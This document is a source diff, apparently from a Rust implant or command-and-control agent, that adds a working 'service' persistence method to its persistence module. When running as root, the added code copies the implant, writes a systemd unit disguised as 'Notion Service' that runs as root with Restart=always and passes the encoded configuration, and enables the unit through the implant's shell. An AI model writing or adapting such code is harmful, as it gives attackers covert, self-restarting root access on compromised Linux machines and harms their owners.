@@ -1,13 +1,13 @@
 use std::error::Error;
 use std::env::{var, args};
+use is_root::is_root;
 #[cfg(not(windows))] use crate::cmd::{shell, save};
-#[cfg(not(windows))] use std::fs::{create_dir, copy};
+#[cfg(not(windows))] use std::fs::{create_dir, copy, write};
 #[cfg(windows)] use std::path::Path;
 #[cfg(windows)] use winreg::{RegKey};
 #[cfg(windows)] use std::fs::copy as fs_copy;
 #[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
-use crate::cmd::ConfigOptions;
-use crate::logger::Logger;
+use crate::config::ConfigOptions;
 
 /// Uses the specified method to establish persistence. 
 /// 
@@ -146,7 +146,37 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                     Ok("Could not copy app to destination".to_string())
                 }
             },
-            "service" => Ok("Persisting via service creation!".to_string()), 
+            "service" => {
+                if is_root() {
+                    create_dir(&app_dir)?;    
+                    if let Ok(_) = copy(&app_path, &dest_path) {
+                        let b64_config = config_options.to_base64();
+                        let svc_path = "/lib/systemd/system/notion.service";
+                        let svc_string = format!(
+"[Unit]
+Description=Notion Service
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+ExecStart={dest_path} -b {b64_config}
+
+[Install]
+WantedBy=multi-user.target"
+);
+                        write(svc_path, svc_string)?;
+                        return shell::handle(&"systemctl enable notion.service".to_string()).await;
+                    } else {
+                        return Ok("Could not copy service file".to_string());
+                    }
+                } else {
+                    return Ok("Need to be root first. Try enable.".to_string());
+                }
+            }, 
             _         => Ok("Unknown persistence method!".to_string())
         }
     }
